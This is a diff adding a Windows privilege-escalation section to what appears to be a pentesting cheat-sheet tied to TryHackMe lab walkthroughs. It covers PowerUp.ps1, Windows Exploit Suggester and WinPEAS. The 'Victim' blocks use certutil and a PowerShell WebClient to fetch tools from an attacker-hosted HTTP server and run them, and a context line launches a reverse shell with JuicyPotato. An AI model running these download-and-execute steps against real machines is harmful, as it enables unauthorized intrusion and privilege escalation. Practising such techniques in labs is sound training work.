@@ -92,3 +92,90 @@ JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
 
 
 
+## **Automated Enumeration Tools**
+
+| Name                      | Link                                                                                                                                                                                  |
+| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| WinPeas                   |                                                                                                                                                                                       |
+| PowerUp.ps1               | [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 ](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) |
+| Windows Exploit Suggester | [https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git](https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git)                                                        |
+|                           |                                                                                                                                                                                       |
+|                           |                                                                                                                                                                                       |
+
+
+
+## PowerUp.ps1
+
+**Examples**
+
+[#privilege-escalation](../../walkthroughs/tryhackme/steel-mountain.md#privilege-escalation "mention")
+
+**Setup**
+
+**Kali**
+
+```
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 
+python2 -m SimpleHTTPServer 81
+```
+
+**Windows**
+
+```
+certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1 
+. .\PowerUp.ps1 
+Invoke-AllChecks
+```
+
+
+
+
+
+## Windows Exploit Suggester
+
+**Examples**
+
+[hackpark.md](../../walkthroughs/tryhackme/hackpark.md "mention")
+
+**Setup**
+
+Run command then paste output back to Kali in a file called systeminfo.txt
+
+**Victim**
+
+```
+systeminfo
+```
+
+**Kali**
+
+```
+git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git 
+cd Windows-Exploit-Suggester/ 
+python3.9 windows-exploit-suggester.py --update 
+python3.9 windows-exploit-suggester2.py --database 2022-12-03-mssb.xls --systeminfo systeminfo.txt
+```
+
+## **WinPeas**
+
+**Examples**
+
+[hackpark.md](../../walkthroughs/tryhackme/hackpark.md "mention")
+
+**Setup**
+
+**Kali**&#x20;
+
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20221127/winPEASx64.exe 
+python2 -m SimpleHTTPServer 82
+```
+
+**Victim**&#x20;
+
+```
+cd C:\Windows\Temp
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:82/winPEASx64.exe','winPEASx64.exe')" 
+winPEASx64.exe
+```
+
